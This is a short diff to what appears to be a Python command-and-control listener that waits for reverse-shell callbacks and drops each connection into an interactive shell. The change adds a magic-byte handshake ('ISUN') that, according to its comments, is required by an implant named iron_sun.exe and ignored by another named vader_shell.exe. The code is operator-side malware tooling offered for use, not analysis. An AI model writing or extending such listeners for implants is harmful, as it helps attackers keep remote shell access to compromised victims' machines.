@@ -299,6 +299,12 @@ def main():
         while True:
             try:
                 conn, addr = server.accept()
+                # iron_sun magic auth — must send "ISUN" before shell spawns
+                # vader_shell.exe ignores these 4 bytes; iron_sun.exe requires them
+                try:
+                    conn.send(bytes([0x49,0x53,0x55,0x4E]))
+                except Exception:
+                    pass
                 interactive_shell(conn, addr)
                 print("\n  [*] Session ended. Listening for next callback...\n")
             except KeyboardInterrupt:
